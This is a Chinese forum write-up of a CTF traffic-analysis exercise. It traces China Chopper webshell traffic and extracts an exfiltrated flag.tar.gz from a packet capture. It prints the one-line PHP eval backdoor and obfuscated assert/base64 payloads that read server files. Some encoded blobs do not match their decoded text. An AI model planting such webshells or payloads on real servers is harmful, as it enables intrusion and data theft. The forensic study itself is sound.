
由于解码后发现`@ini_set("display_errors","0")`,近一步判断`user-agent`得出结果不是`蚁剑`

```text
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://9c3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0/search/spider.html)
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://607K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0/search/spider.html)
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://4c0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0/search/spider.html)
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://80dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3c8#2i4K6u0W2j5$3!0E0/search/spider.html)
```

分析第二组数据，发现包含`eval`函数和`$POST`

![](https://bbs.kanxue.com/upload/attach/202308/910293_SUFENQWD65C5SU9.png)

获取`X@Y<?php eval($_POST[123]);?> X@Y`，根据菜刀特征`eval`和`$POST`猜测使用工具为菜刀，而`[123]`则为`payload`,这个`123`可以确认是`array_map`数组

##### 还原后门文件

根据第二组数据还原出文件为`3.php`

第二组数据：

```php
123=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9IkM6XFx3d3dyb290XFxmbGFnLnRhci5neiI7JGZwPUBmb3BlbigkRiwncicpO2lmKEBmZ2V0YygkZnApKXtAZmNsb3NlKCRmcCk7QHJlYWRmaWxlKCRGKTt9ZWxzZXtlY2hvKCdFUlJPUjovLyBDYW4gTm90IFJlYWQnKTt9O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D'));\");"));
@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$F='C:\\wwwroot\\3.php';$P=@fopen($F,'r');echo(@fread($P,filesize($F)));@fclose($P);;echo("X@Y");die();
```

内容为`X@Y<?php eval($_POST[123]);?> X@Y`

##### 后门文件的密码是多少

根据第二组会话判断密码为`123`

##### 指令发送使用的是什么编码方式

该参数值是使用`Base64`编码的，所以可以利用`base64解码`可以看到攻击明文。

##### 传输的文件名叫什么

代码审计，分析第三组TCP会话数据发现传输文件名为`flag.tar.gz`，并且会使用`echo("X@Y")`把`X@Y`字符串当做指令写入到文件内部

第三组数据：

```php
123=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9J0M6XFx3d3dyb290XFwzLnBocCc7JFA9QGZvcGVuKCRGLCdyJyk7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbGzZSgkUCk7O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D'));\");"));
@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$F="C:\\wwwroot\\flag.tar.gz";$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');};echo("X@Y");die();
```

##### 还原出传输的文件

- 两种方式

  - 1. 导出文件

  - 2. Wireshark-show Packet Bytes修改start

###### 一、导出文件

查看报文`response`，疑惑`X@Y`文件头信息，发现只是混淆作用

![](https://bbs.kanxue.com/upload/attach/202308/910293_RU2RGQJ36HT2N54.png)

右键查看数据包，定位到文件导出，使用`RAW`流导出

![](https://bbs.kanxue.com/upload/attach/202308/910293_7TDVYF97RCGKZDX.png)

会提示我们格式不支持

![](https://bbs.kanxue.com/upload/attach/202308/910293_4884EZ53T29R6P2.png)

使用`010Editor`打开修改文件头和文件结尾，一般修改文件头即可

![](https://bbs.kanxue.com/upload/attach/202308/910293_SD4PW4UPY7RBVU9.png)

看到`58 40 59`,我们查看文件头根本查不到，因为这是混淆我们的,去掉`58 40 59`后保存,也可以根据`1F 8B`特征判断

![](https://bbs.kanxue.com/upload/attach/202308/910293_JU7VEDNAE9TU8F5.png)

修改后保存可以正常打开，解压发现有一个`flag.txt`文件

![](https://bbs.kanxue.com/upload/attach/202308/910293_Y32T6BNGM5CQXP5.png)

###### 二、Wireshark-show Packet Bytes修改start

修改为`compressed`表示解压缩,后面start 表示字节往右边偏移几位，`X@Y`就需要偏移三位就可以获取到

![](https://bbs.kanxue.com/upload/attach/202308/910293_RTGXHN4B8S8G4DY.png)

##### Flag

文件获取`flag`：

![](https://bbs.kanxue.com/upload/attach/202308/910293_UF7G2JKQW63J28S.png)

`Wireshark-show Packet Bytes`修改start 获取`flag`

![](https://bbs.kanxue.com/upload/attach/202308/910293_NP9XZ5VPGZSEPBF.png)

#### 0x04 小结

流量分析水平得到了提升，对菜刀工具特征有了清晰的认识。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2023-8-18 08:10 被Spider\_008编辑，原因： 图片不显示
